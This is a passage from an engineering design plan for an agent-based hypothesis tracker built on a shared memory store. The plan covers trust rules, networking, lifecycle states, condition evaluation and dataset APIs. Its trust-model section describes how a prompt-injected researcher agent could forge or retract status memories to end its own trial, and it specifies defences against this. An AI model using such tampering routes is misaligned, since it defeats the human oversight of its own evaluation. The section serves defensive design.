> are stated in O10's documentation and in `dataset_get`'s own tool description.

**Rejected alternatives:**

- *Cross-session artifact hand-off* — works today with zero engine changes (session-mode
  schedules exist, workspaces survive archive/restore, artifacts upsert by path), but caps out on
  unbounded transcript growth in a session resumed daily for a year, and enforces a single writer.
- *A blob store in Wolf* — keeps machinery out of Orange, but makes Wolf a stateful service and
  produces nothing reusable for the next embedder.
- *MCP tools returning bytes* — defeats the purpose; an MCP result is model context.
- *A cumulative-snapshot memory* — the whole series would cross the model's context daily.

---

## The trust model

**This section is load-bearing. Two tickets exist only because of it. Read it before W4, W5 or
W10.**

Orange's memory is a genuine shared bus: project-scoped, append-only, **no per-worker permissions
and no origin check** (`docs/19-embedding.md` § 8). A chat session with core tools may do
"everything a worker may do", and labels are chosen entirely by the caller. `latest_per=name`
returns the newest row per name **regardless of who wrote it**.

Therefore, if Wolf derived a hypothesis's status from "the newest memory labelled
`kind=hypothesis, name=<id>`", then:

- the researcher could append `status=confirmed` and end its own trial;
- the interviewer session could do the same;
- **a prompt-injected web page read during "deep research" could do it** — and deep web research
  on adversarial content is this product's core activity.

### The rule

> **Authoritative hypothesis state is only ever read from memories with EMPTY PROVENANCE.**
> A memory is *trusted* if and only if `created_by_worker == ""` **and**
> `created_by_session == ""`.

Provenance is stamped by the server from the caller's credential and cannot be supplied by the
caller. Anything written from inside a container carries either a worker name or a session id,
and is therefore **advisory**.

⚠️ **Empty provenance is necessary but not sufficient.** Two paths produce it: the new
`POST /agent/memories` route (O7), and `agentdb.ApplyTopology`, which writes memory seeds with no
provenance (`go/agentdb/topology_apply.go`, asserted by `go/topology/topology_test.go:242-243`)
and is reachable at `POST /agent/topologies/apply` by any API-class credential. Today no shipped
topology can seed a `kind=hypothesis` label — the one that seeds memory uses fixed
`{kind:registry, name:label-registry}` labels and the request body cannot supply its own — so
there is no live forgery path. But the invariant Wolf relies on is therefore:

> **A memory is trusted iff its provenance is empty AND its kind is in `TRUSTED_KINDS` AND `name`
> matches an existing `hyp-<id>` session.** The last clause is the one that cannot be forged from
> inside a container: creating a named session requires an API key or a console JWT.

`TRUSTED_KINDS` is **enumerated, never counted**: `hypothesis`, `hypothesis-spec`, `verdict`,
`evaluation`, `report-template`. *(An earlier draft said "the five kinds" while the vocabulary
listed six — `evaluation` was added by R29 and the numeral never updated. An executor enumerating
five would make every memory the poller writes untrusted, the board would silently show no
`support_score`, and no test in either ticket would fail. Do not reintroduce a count.)*

⚠️ **Empty provenance is not sufficient for `report` either — labels are caller-chosen.** A
researcher session for hypothesis A can append `kind=report, name=<B>` and own hypothesis B's
headline and panel. Every `report`, `report-candidate` and `report-amendment` read is checked
against the writing worker or session belonging to *that* hypothesis, and a mismatch is
`Tamper{reason: "cross_hypothesis_write"}`.

Note also that an **embed token is API-class** and its `scope` claim is enforced only on
session-by-id routes (hazard H1), so it is not confined on `POST /agent/topologies/apply`. Wolf
must never hand an embed token to anything it would not trust with the project.

| Memory kind | Written by | Trusted? | Consequence |
| --- | --- | --- | --- |
| `hypothesis` (state + status) | Wolf API only | **Yes** | The board renders it |
| `hypothesis-spec` | Wolf API only, at go-live | **Yes** | The evaluator reads it |
| `verdict` | Wolf API only, human-initiated | **Yes** | Terminal |
| `research-note` | the researcher agent | No | Displayed as evidence, never as state |
| `spec-amendment` | the researcher agent (proposal) | No | Rendered as a *proposal*; a human accepting it makes Wolf write the trusted spec |

### Reading the board without giving up the one-request fast path

`latest_per` cannot filter on provenance, but **search results DO carry provenance** —
`MemorySearchResult` includes `created_by_worker` and `created_by_session`
(`go/agentdb/memories.go:113-121`). So:

1. One request:
   `GET /agent/memories?selector=kind%3Dhypothesis&latest_per=name&limit=100&include_retracted=1`.

   ⚠️ **`include_retracted=1` is load-bearing and was missing from this step until 2026-08-21
   (R90).** Without it Orange's `notRetractedSQL` hides Wolf's newest state row, and `latest_per`
   hands back the OLDER trusted row beneath it — which passes the trust rule, so the board renders
   it as authoritative with no tamper flag at all. A prompt-injected researcher that simply
   **retracts** Wolf's newest `kind=hypothesis` row therefore rolls the board back to the previous
   status silently: the resurrection attack, succeeding on the exact surface this section exists to
   protect. W5's independent verifier constructed it and it worked. It is one query parameter, it
   keeps the clean case at exactly one request, and O11's paired criterion — *"this pair is the
   contract W5's tamper detection is written against"* — was written for it.
2. Any row whose provenance is empty **and which carries no retraction** is authoritative — render
   it. **This is the normal case and costs exactly one request.**
3. Any row whose provenance is NOT empty, **or which carries a `retracted_by`**, is an anomaly:
   something inside a container wrote or withdrew a `kind=hypothesis` memory. For those ids only,
   issue
   `GET /agent/memories?selector=kind%3Dhypothesis,name%3D<id>&limit=50`, take the newest trusted
   row, and render the hypothesis with a **tamper warning** naming the writer.

The forged row never becomes state, and the anomaly is surfaced rather than swallowed.

### Retraction — the back door, and the one that matters more

Appending a *newer* row is the obvious attack and the one the rule above defeats. **Retraction is
strictly more powerful and defeats the rule as originally written.**

`notRetractedSQL` (`go/agentdb/memories.go:284-288`) hides any row `X` for which *any* memory in
the project carries the label `retracts=<X.id>`. It correlates on the **retracted row's id and
project only — it never checks who wrote the retraction.** It is applied to exactly the two paths
Wolf's board depends on: `NewestMemory` (`:353`) and `SearchMemories` (`:407`).

`retracts` is an ordinary label, so any session with core MCP tools can call
`memory_create(labels: {retracts: "<trusted-id>"})`, and the trusted memory's uuid is discoverable
because `memory_search` results carry `ID`. A prompt-injected researcher therefore does not need
to forge a status — **it deletes the real one from every search path**, and the hypothesis either
silently vanishes from the board or falls through to whatever untrusted row remains.

Three facts make this fixable:

1. **`GET /agent/memories/{id}` is deliberately NOT retraction-filtered.** The comment at
   `go/agentdb/memories.go:281-283` says so in as many words: *"fetching a specific id is an
   explicit request for that row, and being able to read what was withdrawn — and the retraction
   that withdrew it — is the point of not deleting anything."* A retracted memory is readable if
   you know its id.
2. **The set of hypotheses is knowable without memory at all.** Every hypothesis has a named
   session `hyp-<id>`, and creating one requires an API key or console JWT. `GET /agent/sessions?user_email=*`
   is therefore an unforgeable index.
3. A retraction is itself a memory, carrying its own provenance.

**The rule, restated:**

> Wolf's authoritative index of hypotheses is the **session list**, not memory. For each
> hypothesis in that index, Wolf resolves state from trusted memories read with retractions
> **visible** (ticket O11's `include_retracted=1`), and **ignores any retraction whose own
> provenance is non-empty** — an untrusted actor cannot withdraw server-written state. A
> hypothesis present in the session index whose state row is retracted by an untrusted retractor
> is rendered from the retracted row, with a tamper warning naming the retractor.

A retraction written by Wolf itself (empty provenance) is honoured normally — that is how Wolf
corrects its own mistakes.

### Where the falsifiability actually lives

The locked scoreboard is enforced by three things, none of which is a prompt:

1. **The spec is a trusted memory** — the researcher cannot rewrite it, only propose.
2. **Conditions are typed predicates evaluated in Wolf** (§ "Condition semantics") over dataset
   CSV that Wolf parses itself. The model does not decide whether a condition tripped.
3. **The researcher's system prompt is composed as `locked preamble + mutable method body`**, and
   the critic may only rewrite the method body (W12). The preamble carries the spec and the
   scoring contract verbatim.

### Derived metrics are the weak point, and are pinned

A `derived` metric has no external source, so nothing can independently recompute it — its
methodology lives only in a prompt the critic rewrites weekly. Left alone, "improving the research
method" silently changes what the appended number *means*, and the invalidation condition then
tests a spliced series.

**Therefore a `derived` metric MUST carry a `method` object in the locked spec** (formula,
constituents, source series, units), that object is composed into the locked preamble verbatim,
and changing it requires a human-accepted amendment exactly like changing a threshold.

---

## Local topology and networking

**This is the fact that breaks a naive deployment.** In the compose stack, `agentd` shares DinD's
network namespace (`docker-compose.yml:85`, `network_mode: "service:dind"`). Consequences,
verified:

- Nested session containers reach `agentd` at the DinD bridge gateway, **`http://172.17.0.1:8099`**
  (`docker-compose.yml:98`, `AGENTKIT_SELF_URL`). This is **not** a browser-reachable URL.
- Other compose services reach `agentd` as **`http://dind:8099`** — which is why nginx proxies to
  exactly that (`deploy/web.nginx.conf:43,55,65,69`).
- Only the `web` service publishes a host port (`docker-compose.yml:209-210`).
- Nested containers cannot resolve compose service names: nested Docker does not inherit the
  compose DNS resolver.

**So a `wolf-api` sitting on the ordinary compose network is unreachable from session containers**,
and both `series_fetch` and Wolf's download URLs would fail. The topology below is mandatory, not
advisory:

```
   browser
      │  http://localhost:${WOLF_WEB_PORT:-8081}
      ▼
   wolf-web  (nginx; on network agent-orange_default)
      │  proxy_pass http://dind:8100   ← wolf-api shares dind's netns
      ▼
   wolf-api  network_mode: "container:${ORANGE_DIND_CONTAINER}"
      │        · reaches agentd at  http://localhost:8099   (same netns!)
      │        · reachable from session containers at  http://172.17.0.1:8100
      ▼
   agentd ──► DinD ──► session containers
                          curl http://172.17.0.1:8100/mcp        (market data)
                          curl http://172.17.0.1:8099/agent/…    (datasets)
```

Two rules follow, and both are ticket acceptance criteria:

- **`dataset_get`'s `download_url` MUST be built on `AGENTKIT_SELF_URL`, never on
  `AGENTKIT_PUBLIC_BASE_URL`.** They are deliberately different values
  (`go/cmd/agentd/permalink.go` documents the split); the public base is for humans clicking
  permalinks and is unreachable from a nested container.
- **`WOLF_MCP_URL`, the value written into the project's MCP config, is
  `http://<dind-gateway>:${WOLF_API_PORT}/mcp` in the compose stack.** In a real deployment both
  services are ordinary hosts and it is a normal URL; the variable exists so nothing hard-codes
  either form.

**`172.17.0.1` is a default, not a constant — discover it (owner decision 2026-08-21, R43).**
It is DinD's inner `docker0` gateway, and Docker allocates `172.17.0.0/16` only if that subnet is
free; W1's verifier reproduced it becoming `172.18.0.1`. Because session containers reach wolf-api
at that address, a shift makes every MCP tool call from inside a session time out with no obvious
cause. Therefore:

- `api/src/config.ts` resolves the gateway **at boot**: read the default route from inside DinD's
  netns (`ip route show default`, or `/proc/net/route`'s destination-`00000000` entry — wolf-api
  shares that namespace, so this reads DinD's own table). Fall back to the literal `172.17.0.1`
  when discovery fails, and `pino`-log which of the two was used, at info, once.
- If `WOLF_MCP_URL` is set explicitly in the environment it **wins** — discovery only fills the
  default. A real deployment sets it and never runs the probe.
- The same resolved value is what W12's bootstrap writes into the project's MCP config, so
  discovery happens in exactly one place.

---

## Hypothesis lifecycle

```
                     ┌──────────────────────────────────────────┐
                     │                                          │
  draft ──go-live──▶ live ──evaluator trips a condition──▶ challenged ──human──▶ confirmed
    │                 │                                     │                     invalidated
    │                 └──horizon_days elapsed──────────────▶ │                          ▲
    │                                                        └──human accepts amendment─┘
    └──human──▶ archived ◄────────────────human, from any non-terminal state─────────────┘
```

| State | Meaning | Who may write it |
| --- | --- | --- |
| `draft` | Interview in progress; no worker, no schedule, no datasets | Wolf, on create |
| `live` | Scoreboard locked; daily research running | Wolf, on human go-live |
| `challenged` | A condition tripped **or** the horizon elapsed; awaiting a human | Wolf, by the evaluator poller |
| `confirmed` | Terminal. The thesis held | Wolf, human-initiated only |
| `invalidated` | Terminal. The thesis failed | Wolf, human-initiated only |
| `archived` | Retired without a verdict | Wolf, human-initiated only |

#### The legal transitions, enumerated (owner decision B3)

W5's criterion is "an exhaustive table over all ordered state pairs", which needs a legal set to be
exhaustive *against*. This is it. Everything not listed is illegal and throws a typed error naming
both states.

| From | To | Trigger |
| --- | --- | --- |
| `draft` | `live` | Human go-live, after the spec validates and a report template is accepted |
| `draft` | `archived` | Human retires an un-launched hypothesis |
| `live` | `challenged` | The poller: a condition tripped, or `horizon_days` elapsed |
| `live` | `archived` | Human retires |
| `challenged` | `confirmed` | Human verdict, with a rationale |
| `challenged` | `invalidated` | Human verdict, with a rationale |
| **`challenged`** | **`live`** | **Human accepts a spec amendment.** Without this edge every amended hypothesis is stuck at `challenged` forever while its research keeps running — there would be no route back to normal operation, which would make amendment pointless |
| `challenged` | `archived` | Human retires |

`confirmed`, `invalidated` and `archived` are **terminal**: no edge leaves them. A hypothesis that
needs to run again is a new one, carrying `restated_from`.

**A transition from a state to itself is a no-op, not an error.** It returns success and appends
nothing. This is what makes W10's idempotence criterion mean something: the poller re-asserts the
state it computed on every tick, and a poller forced to read-then-write under the mutex to avoid
throwing is more code at exactly the place concurrency bugs live.

*(The ASCII diagram above draws the amendment edge ambiguously — it appears to point at
`invalidated`. This table is authoritative; the diagram is a sketch.)*

**Transitions are serialised per hypothesis inside wolf-api** (an in-process async mutex keyed by
hypothesis id), and the current state is re-read from Orange *inside* the critical section. There
is no compare-and-swap on memories, so two concurrent writers would otherwise both append and the
later one would silently win. This is sufficient **only while wolf-api runs as a single
instance**, which is a stated constraint of this plan; running two replicas requires a real lock
and is out of scope.

### Orange atoms per hypothesis

| Atom | Name | Created | Torn down |
| --- | --- | --- | --- |
| Session (chat surface) | `hyp-<id>` | at draft, with `worker: interviewer` | third |
| Worker (daily researcher) | `researcher-<id>` | **at go-live**, not at draft | second |
| Schedule (daily, worker-mode) | — | at go-live | **first** |
| Datasets | `<id>-<metric-slug>` | first tick | **never** |

**Teardown order is load-bearing.** Disabling a worker does not stop its schedule: the scheduler
only checks that the worker *exists* (`go/cmd/agentd/scheduler.go:363-371`), and dispatch then
fails the delivery with `worker "x" is disabled` (`go/cmd/agentd/dispatch.go:246-248`) — one
failed job row per day until the five-consecutive-failure streak retires the schedule
(`go/cmd/agentd/scheduler.go:768-790`). Deleting the schedule first avoids all of it.

**Deleting the schedule is not sufficient on its own.** A delivery already queued behind the
capacity gate dispatches on a later tick, after the worker is gone. Teardown therefore also
**drains pending deliveries for that worker** before deleting it (W9), and a tick session still
in flight is allowed to finish — anything it writes is untrusted by construction and cannot
change state.

Two shared project-level workers exist alongside the per-hypothesis ones:

- **`interviewer`** — the prompt behind every hypothesis chat session.
- **`critic`** — a weekly schedule that reads recent research notes and rewrites the **method
  body** of `researcher-<id>` prompts through `worker_prompt_write`. A schedule rather than a
  `worker.finished` subscription: envelope filters are equality-only, so a per-worker subscription
  would need one row per hypothesis, and a filterless one would fire on every worker in the
  project.

---

## Condition semantics

**The single most important specification in this document.** Revision 1 had conditions as free
text (`"drawdown_pct > 25 sustained 30d"`), which nothing could evaluate — the only reader would
have been the researcher model, judging whether its own trial should end. Conditions are now
typed and evaluated deterministically by wolf-api.

### The condition object

```jsonc
{
  "id": "inv-1",                       // unique within the spec, kebab
  "metric": "drone-suppliers-basket",  // must name a metric slug in the same spec
  "stat": "drawdown_pct",              // level | change_abs | change_pct | drawdown_pct | ratio_to
  "ratio_metric": null,                // required iff stat == "ratio_to"; another slug
  "ratio_lookback_days": null,         // required iff stat == "ratio_to"; [1, 400]
  "reference": "peak_since_live",      // peak_since_live | value_at_live | trailing_n_days
  "reference_days": null,              // required iff reference == "trailing_n_days"
  "op": "gt",                          // gt | gte | lt | lte
  "threshold": 25,
  "sustained_days": 30,                // 0 means "a single observation is enough"
  "meaning": "the basket is not responding to the thesis"   // prose, for humans only
}
```

### Statistic definitions — implement exactly these

Let `v` be an observation's value, `t` its timestamp, `L` the go-live timestamp, and `R` the
reference value.

| `stat` | Reference `R` | Computed statistic |
| --- | --- | --- |
| `level` | not used | `v` |
| `change_abs` | per `reference` | `v - R` |
| `change_pct` | per `reference` | `100 * (v - R) / R` |
| `drawdown_pct` | per `reference` | `100 * (R - v) / R` |
| `ratio_to` | not used | `v / v_other`, where `v_other` is `ratio_metric`'s value at the nearest timestamp **at or before** `t`, within `ratio_lookback_days`; no such point ⇒ that observation is skipped |

**`change_abs` exists because percentages are undefined on series that cross zero.** Real rates,
net exports and trade balances all go negative, and this product's premise is FRED macro data.
Use `change_abs` or `level` for any series that can be ≤ 0.

| `reference` | `R` is |
| --- | --- |
| `value_at_live` | the metric's value at the first observation with `t >= L` |
| `peak_since_live` | the maximum value over `[L, t]` (a running peak, recomputed per observation) |
| `trailing_n_days` | the mean value over `[t - reference_days, t)` |

**Non-positive references — the rule, stated once and applying to every statistic that divides by
`R` (`change_pct` and `drawdown_pct`):**

- `R <= 0` ⇒ that observation is **skipped**. Not zero, not infinity, not an error — skipped.
  Dividing by a negative reference silently inverts the sign of the comparison, which is how a
  condition trips backwards.
- If **every** observation is skipped for this reason, the condition is `indeterminate` with
  reason `non_positive_reference`, and the UI shows that reason. It is a spec mistake — a
  percentage statistic on a zero-crossing series — and a human should fix it with an amendment.
- `v_other == 0` for `ratio_to` ⇒ that observation is skipped, same rule.

**Mixed-frequency `ratio_to`.** `ratio_lookback_days` is required and settable precisely because a
daily metric measured against a monthly FRED series resolves on only a handful of days per month
at a 7-day lookback, which combined with the coverage floor below makes such a condition
permanently `indeterminate`. Set it to at least twice the coarser series' period — the interviewer
prompt says so, and W3 rejects a `ratio_to` condition that omits it.

### Evaluation

For each condition, over observations with `t >= L`:

1. Compute the statistic at every observation.
2. `holds(obs)` is `op(stat, threshold)`.
3. If `sustained_days == 0`: the condition **trips** if `holds` at the most recent observation
   **and** that observation is fresher than `staleness_days` (spec-level, default `5`). An
   observation older than that yields `indeterminate` with reason `stale_series`.
4. Otherwise let `W` be the window `(nowMs - sustained_days, nowMs]` — **anchored on evaluation
   time, not on the last observation.** The condition **trips** iff `holds` is true at **every**
   observation in `W` **and** `W` contains at least `ceil(sustained_days * 0.6)` observations.

   > **This is the difference between two products.** Anchoring on `t_last` instead would mean a
   > feed that died sixty days ago mid-trip keeps tripping forever on ancient data, and its
   > coverage floor would still be satisfied because it is measured against `t_last`. Anchoring on
   > `nowMs` makes a dead feed's recent window empty, so it goes `indeterminate` and surfaces as a
   > problem for a human. `nowMs` is the fourth argument of W4's `evaluate` for exactly this
   > reason and for no other.
5. **Insufficient coverage ⇒ `indeterminate`, never `tripped`.** Weekends, holidays and provider
   outages must not be able to trip a condition by absence of contrary evidence.
6. Any metric with no observations at all ⇒ `indeterminate`.

Result per condition: `{ id, state: "tripped"|"holding"|"indeterminate", value, window_start,
window_end, observations_in_window, evaluated_at }`.

**A hypothesis moves `live → challenged` when any condition is `tripped`.** `indeterminate`
never trips anything; three consecutive evaluations at `indeterminate` for the same condition
raise a human-attention flag on the hypothesis instead (a scoreboard nobody can compute is a
problem to surface, not to ignore).

#### Every condition result carries a `reason`

The per-condition shape the evaluator emits includes `reason`, and W14 renders it. The closed
vocabulary is `condition_tripped`, `insufficient_coverage`, `non_positive_reference`,
`stale_data`, `no_ratio_pair` — the last added because a `ratio_to` condition whose every
observation skips for want of a partner point otherwise has **no defined outcome**, and W4 mandates
a fixture for exactly that case. Timestamp fields on that shape are `window_start_ms`,
`window_end_ms` and `evaluated_at_ms`.

### The support score — what `weight` is for

Revision 1 validated `weight` and then never used it. It now has exactly one consumer.

For each metric, `direction_score s_i`:

- Let `c = change_pct` of the metric from `value_at_live` to its most recent observation.
- `flat_band_pct` defaults to `2.0` and is settable per spec.
- `expected up`: `s = +1 if c > flat_band else -1 if c < -flat_band else 0`
- `expected down`: `s = -1 if c > flat_band else +1 if c < -flat_band else 0`
- `expected flat`: `s = +1 if |c| <= flat_band else -1`
- No observations ⇒ `s = 0`.

`support_score = Σ (weight_i * s_i)`, in `[-1, 1]`. It is displayed on the board and on the
detail page. **It never trips anything** — only conditions do. It is a summary for humans, and
saying so in the UI is a W14 acceptance criterion.

### Where the board's numbers come from

`support_score` and the condition summary are computed by the poller from datasets. They are not
on the hypothesis memory, and they cannot be: a `live` hypothesis's newest trusted row is the
go-live row, and the board read returns **labels plus a 500-byte snippet, no content**. Two
non-answers, rejected explicitly:

- *Put the score in a label.* `support_score=-0.42` is an **illegal label value** — values must
  begin alphanumeric. And a poller that re-writes the row every 5 minutes appends ~14k memories a
  day, drowning `latest_per`.
- *Read each hypothesis's dataset from the board route.* That is N×M dataset fetches to paint one
  page.

**The answer: the poller appends a `kind=evaluation` trusted memory whose FIRST LINE is a compact
summary**, and the board reads it with a second `latest_per` call. Two requests paint the board,
both O(1) in the number of hypotheses.

```
GET /agent/memories?selector=kind%3Dhypothesis&latest_per=name    → state
GET /agent/memories?selector=kind%3Devaluation&latest_per=name    → score + condition summary
```

Line 1 format, which must fit inside 500 bytes and is parsed by Wolf:

```
score=-0.42 tripped=1 holding=3 indeterminate=0 evaluated=2026-08-20T06:05:00Z
```

The rest of the content is the full evaluation snapshot as JSON. **The poller appends a new
`kind=evaluation` memory only when that summary line differs from the last one, or when more than
20 hours have passed** — so a quiet hypothesis produces one row a day, not 288.

### Snapshotting, because the reaper will delete the evidence

Datasets are replaced whole every tick and O3's reaper keeps the newest 30 versions — roughly 30
days. A hypothesis invalidated on day 90 would, by day 121, have no surviving copy of the data the
verdict was made on. Worse, a provider restatement can make a tripped condition silently *un*-trip
with no record it ever fired.

**Therefore: whenever the evaluator moves a hypothesis to `challenged`, and whenever a human
records a verdict, Wolf writes the full evaluation result — every condition's state, value and
window, plus the observations inside each window — into the trusted memory it appends.** The
memory is the permanent record; the dataset is working storage.

### The shrink guard

`replace-whole` has a failure mode CAS cannot catch, because it is the same writer: a provider
outage returning a truncated history replaces a year of data with a stub. `dataset_put` therefore
refuses a replacement whose row count is below 50% of the current version's unless the caller
passes `allow_shrink: true`, and the researcher's prompt forbids passing it without filing a
research note that says why.

---

## File Structure

### agent-orange

| File | Action | Purpose |
| --- | --- | --- |
| `go/agentdb/migrations.go` | Modify | Append `045_datasets` (highest today is `044_agent_sessions_launch_image`, at `:1045`) |
| `go/agentdb/datasets.go` | Create | `Dataset` type + store: create-with-CAS, current, get, list, versions, reap, orphan sweep |
| `go/agentdb/datasets_test.go` | Create | Table tests |
| `go/agentdb/datasets_live_test.go` | Create | jsonb + CAS + concurrency; skip unless `AGENTKIT_TEST_POSTGRES_URL` |
| `go/httpapi/datasets.go` | Create | Four read routes |
| `go/httpapi/datasets_test.go` | Create | Route tests |
| `go/httpapi/memories.go` | Modify | Add `CreateMemory` handler (O7); add `include_retracted` (O11) |
| `go/agentdb/memories.go` | Modify | `MemoryQuery.IncludeRetracted` + `retracted_by` (O11) |
| `go/httpapi/memories_test.go` | Modify | Append-route tests incl. the provenance invariant |
| `go/httpapi/httpapi.go` | Modify | Route constants (`:359-389`), registration (`:463-475`), `MemoryStore` gains `CreateMemory` |
| `go/cmd/agentd/datasettoken.go` | Create | Short-TTL `scope: "dataset:<id>"` tokens, modelled on `embedtoken.go` |
| `go/cmd/agentd/mcp_datasets.go` | Create | `dataset_list` / `dataset_get` / `dataset_put` |
| `go/cmd/agentd/mcp_datasets_test.go` | Create | Tool contract tests |
| `go/cmd/agentd/main.go` | Modify | One `mcpSrv.register(...)` line beside `:572-573`; reaper wiring |
| `go/cmd/agentd/gc.go` | Modify | Dataset version reaper interval + boot log |
| `go/systemtest/datasets_test.go` | Create | Real-container round trip |
| `docker-compose.yml` | Modify | `WOLF_API_KEY`, `WOLF_MCP_TOKEN`, `AGENTKIT_MCP_ENV`, reaper interval |
| `.env.example` | Modify | Document all of the above plus a worked `AGENTKIT_PROJECT_MAP` for `wolf` |
| `docs/20-datasets.md` | Create | The atom, its contract, its hazards |
| `docs/19-embedding.md` | Modify | Route summary gains datasets + the memory append route |
| `CLAUDE.md` | Modify | Repo-map/status line |

### agent-wolf

| Path | Purpose |
| --- | --- |
| `api/src/config.ts` | Env parsing; fails fast with a named variable |
| `api/src/orange/client.ts` | Typed Orange client |
| `api/src/orange/types.ts` | Response shapes, timestamp units in the type names |
| `api/src/hypothesis/spec.ts` | Spec + condition schema and validator |
| `api/src/hypothesis/evaluate.ts` | The deterministic condition evaluator + support score |
| `api/src/hypothesis/lifecycle.ts` | State machine + per-id serialisation |
| `api/src/hypothesis/store.ts` | Hypotheses as trusted memories; tamper detection |
| `api/src/hypothesis/provision.ts` | Go-live provisioning; ordered teardown with delivery drain |
| `api/src/hypothesis/poller.ts` | Runs the evaluator after each tick; horizon expiry |
| `api/src/marketdata/{fred,stooq}.ts` | Provider connectors |
| `api/src/marketdata/normalise.ts` | Any provider shape → canonical CSV |
| `api/src/marketdata/cache.ts` | Response cache |
| `api/src/mcp/server.ts` | HTTP MCP: `series_search`, `series_fetch` |
| `api/src/routes/{auth,hypotheses,embed,series}.ts` | The nine Wolf API routes |
| `web/src/pages/{HypothesisList,HypothesisDetail,NewHypothesis,Archive}.tsx` | The four pages |
| `web/src/components/{OrangeChatFrame,Scoreboard,MetricChart,Timeline,StatusChip,ConditionTable,TamperWarning}.tsx` | Components |
| `installations/wolf/Dockerfile` | `core` + python3 + pandas + numpy + duckdb |
| `prompts/{interviewer,researcher-preamble,researcher-method,critic}.md` | The four prompt parts |
| `scripts/bootstrap-project.ts` | Idempotent project setup |
| `docker-compose.yml`, `.env.example`, `README.md` | Local topology per § "Local topology" |
| `e2e/run.sh`, `e2e/features/*.spec.ts`, `e2e/mock/*.json` | Playwright + mock-model scripts |

---

## Interfaces

### Migration `045_datasets`

```sql
CREATE TABLE datasets (
  id                 TEXT PRIMARY KEY,
  project            TEXT NOT NULL,
  name               TEXT NOT NULL,
  version            INTEGER NOT NULL,
  labels             JSONB NOT NULL DEFAULT '{}',
  blob_path          TEXT NOT NULL,
  size_bytes         BIGINT NOT NULL,
  row_count          INTEGER NOT NULL DEFAULT 0,
  sha256             TEXT NOT NULL,
  content_type       TEXT NOT NULL DEFAULT 'text/csv',
  created_by_worker  TEXT NOT NULL DEFAULT '',
  created_by_session TEXT NOT NULL DEFAULT '',
  created_at         BIGINT NOT NULL           -- unix MILLISECONDS, like memories
);
CREATE UNIQUE INDEX datasets_project_name_version ON datasets (project, name, version);
CREATE INDEX datasets_project_name_current ON datasets (project, name, version DESC);
CREATE INDEX datasets_labels ON datasets USING GIN (labels);
```

`row_count` exists for the shrink guard and is counted server-side from the pulled bytes, never
supplied by the caller. Dataset `name` uses the label-value charset, ≤63 chars.

### Go store signatures (O2, O3)

```go
// datasets.go
type Dataset struct {
    ID, Project, Name           string
    Version                     int
    Labels                      LabelSet
    BlobPath, SHA256, ContentType string
    SizeBytes                   int64
    RowCount                    int
    CreatedByWorker             string
    CreatedBySession            string
    CreatedAt                   int64 // unix MILLISECONDS
}

var ErrDatasetNotFound = errors.New("dataset not found")

// ErrDatasetVersionConflict carries the version the caller should have passed.
type ErrDatasetVersionConflict struct{ Current int }

func (s *Store) CreateDatasetVersion(ctx context.Context, d *Dataset, ifVersion int) (*Dataset, error)
func (s *Store) CurrentDataset(ctx context.Context, project, name string) (*Dataset, error)
func (s *Store) GetDatasetVersion(ctx context.Context, project, name string, version int) (*Dataset, error)
func (s *Store) ListDatasets(ctx context.Context, project, selector string, limit int) ([]*Dataset, error)
func (s *Store) ListDatasetVersions(ctx context.Context, project, name string, limit int) ([]*Dataset, error)
// The blob seams. agentdb CANNOT import extension — extension.go:12 imports agentdb, so the
// reverse is an import cycle. These two single-method interfaces are declared IN agentdb and
// satisfied by whatever the host wires in cmd/agentd.
type DatasetBlobDeleter interface{ Delete(ctx context.Context, key string) error }
type DatasetBlobLister  interface{ List(ctx context.Context, prefix string) ([]string, error) }

func (s *Store) ReapDatasetVersions(ctx context.Context, keepPerName int, blobs DatasetBlobDeleter) (deleted int, err error)

// Returns blob keys under DatasetBlobPrefix that NO dataset row references — the orphans
// themselves, not the known set. Skips blobs younger than minAge so a write in flight is
// never swept.
func (s *Store) ListOrphanBlobPaths(ctx context.Context, blobs DatasetBlobLister, minAge time.Duration) ([]string, error)
```

#### The blob namespace — one constant, stated once

```go
// agentdb/datasets.go
const DatasetBlobPrefix = "_datasets/bytes/"     // then a uuid4 per WRITE ATTEMPT
```

🔴 **This constant is load-bearing for data safety.** `agentd` runs **one global `BlobStore`**,
shared with `_artifacts/bytes/` and with snapshots. An orphan sweep that enumerates with an empty or
wrong prefix would return every artifact and snapshot blob in the project and delete them. O3's
lister therefore re-asserts the prefix immediately before every `Delete`, and O8's sweep does too —
belt and braces, deliberately.

⚠️ **`BlobStore` has no `Put`.** The interface is `Write` / `Read` / `Exists` / `Delete` / `List`.
An earlier draft cited `Put` in O6a; it does not exist.

#### The canonical dataset CSV — every writer and reader agrees on this

```
timestamp,value
2026-08-19T00:00:00Z,141.22
2026-08-20T00:00:00Z,143.90
```

Header exactly `timestamp,value`. RFC3339 in **UTC**, ascending by timestamp, `LF` line endings,
one metric per dataset, no trailing blank line. `series_fetch`'s output is normalised into this
before `dataset_put` is called.

Nothing enforced this before, and the failure is silent: a `t,value` header makes the poller read
zero observations from a legitimately written dataset, and no error surfaces anywhere.

**`row_count` is `max(0, N-1)` where N is the number of LF-terminated lines.** Header-only is `0`,
empty is `0`, a file with no trailing newline still counts its last line. Never `-1`: the column is
`NOT NULL DEFAULT 0` and the 50% shrink guard divides by it.

### Dataset metadata JSON — pinned, because six tickets read it (A4)

An earlier draft elided this as `…metadata…`. O5 ships first and picks; O6b, W2, W10, W11 and X1
are all written against a choice recorded nowhere. Pinned:

```json
{ "id": "ds-…", "name": "1a2b3c4d-drone-suppliers-basket", "version": 7,
  "labels": {"hypothesis": "1a2b3c4d", "metric": "drone-suppliers-basket"},
  "size_bytes": 40213, "row_count": 512, "sha256": "…", "content_type": "text/csv",
  "created_by_worker": "", "created_by_session": "", "created_at": 1789000000123 }
```

`created_at` is unix **milliseconds**. **`blob_path` and `project` are never serialised** — the
first is an internal storage key, the second is already the caller's credential.

Envelopes, also pinned: the list route returns `{"datasets":[…]}`; the single-name route returns
the **bare object**; the versions route returns `{"versions":[…]}`, newest first. O6b's
`dataset_list` output uses byte-identical field names for the ten fields they share.

### Dataset HTTP routes (O5)

```
GET /agent/datasets?selector=&limit=          → {"datasets":[…metadata…]}
GET /agent/datasets/{name}                    → current version metadata
GET /agent/datasets/{name}/versions?limit=    → version history, newest first
GET /agent/datasets/{name}/download?version=&token=
                                              → raw bytes
```

Auth: project API key, console JWT, **or** a matching scoped dataset token supplied as the
`token` query parameter on the download route only. (A query parameter, not a fragment: `curl`
cannot send a fragment, and a header would force the agent to compose one.) The token pins a
`(project, name)` pair, **not** a version — so a URL minted before a tick still resolves to that
name's requested version after it.

Status vocabulary, copied from the artifact route (`go/httpapi/artifacts_download.go:198-257`):
